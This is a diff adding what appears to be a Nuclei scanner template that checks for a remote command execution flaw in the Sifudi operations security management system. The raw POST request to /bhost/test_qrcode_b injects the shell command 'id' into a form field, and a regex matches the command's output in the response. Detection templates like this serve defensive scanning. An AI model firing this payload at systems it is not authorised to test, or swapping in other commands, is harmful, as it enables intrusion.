@@ -1,0 +1,29 @@
+id: sifudi-test_qrcode_b-rce
+
+info:
+  name: 思福迪运维安全管理系统RCE漏洞
+  author: sifudi
+  severity: critical
+  tags: sifudi
+
+http:
+  - raw:
+      - |
+        POST /bhost/test_qrcode_b HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept-Encoding: gzip
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}
+
+        z1=1&z2="|id;"&z3=bhost
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+      - type: status
+        status:
+          - 200
